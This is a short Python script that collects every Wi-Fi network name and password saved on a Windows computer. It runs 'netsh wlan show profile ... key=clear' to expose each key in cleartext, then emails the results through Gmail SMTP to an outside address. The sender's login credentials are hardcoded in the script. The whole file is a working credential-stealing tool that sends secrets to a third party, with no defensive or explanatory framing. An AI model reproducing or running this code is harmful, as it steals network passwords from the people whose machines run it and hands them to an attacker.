import subprocess, smtplib, re

def make(command):
  execute = subprocess.Popen(command, shell=True,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

  result = execute.stdout.read() + execute.stderr.read()
  result = result.decode()
  return result
command = "netsh wlan show profile"
result = make(command)
value = "All User Profile     :([^\n]*)"
patterns = re.findall(value, result)

final_output = ''
for i in patterns:
    ssid = i.strip('\n').strip(' ').strip('\r')
    commands = "netsh wlan show profile name=\""+ str(ssid) +"\" key=clear"
    results = make(commands)
    values = "Key Content            :([^\n]*)"
    patterns = re.findall(values, results)
    password = ''.join(patterns).strip(' ')
    if password == "":
      password = "None\n"
    need = f"{ssid} ==> {password}\n"
    final_output += need

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(user='malwarefinder3@gmail.com', password='3101331013')
server.sendmail('malwarefinder3@gmail.com', 'yembot31013@gmail.com', msg = final_output)
server.quit()

